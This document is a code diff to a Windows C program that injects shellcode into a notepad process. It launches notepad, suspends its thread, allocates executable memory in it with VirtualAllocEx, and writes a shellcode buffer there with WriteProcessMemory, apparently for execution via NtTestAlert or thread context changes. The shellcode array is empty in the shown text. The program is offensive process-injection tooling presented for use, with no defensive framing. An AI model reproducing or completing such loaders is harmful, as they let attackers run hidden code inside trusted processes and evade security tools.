@@ -19,7 +19,8 @@
 #include<Windows.h>
 #include<stdio.h>
 
-char shellcode[] ="";
+char shellcode[] =
+"";
 
 typedef VOID(NTAPI* pNtTestAlert)(VOID);
 
@@ -28,9 +29,9 @@ int main() {
 	si.cb = sizeof(si);
 	PROCESS_INFORMATION pi = { 0 };
 	pNtTestAlert NtTestAlert = (pNtTestAlert)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtTestAlert");
-	CreateProcessA(NULL, (LPSTR)"notepad", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
-	//Sleep(1000);//Wait for thread initialization to complete -> nttestalert is executed
-	//SuspendThread(pi.hThread);
+	CreateProcessA(NULL, (LPSTR)"notepad", NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
+	Sleep(1000);//Wait for thread initialization to complete -> nttestalert is executed
+	SuspendThread(pi.hThread);
 	LPVOID lpBuffer = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	WriteProcessMemory(pi.hProcess, lpBuffer, shellcode, sizeof(shellcode), NULL);
 	CONTEXT ctx = { 0 };
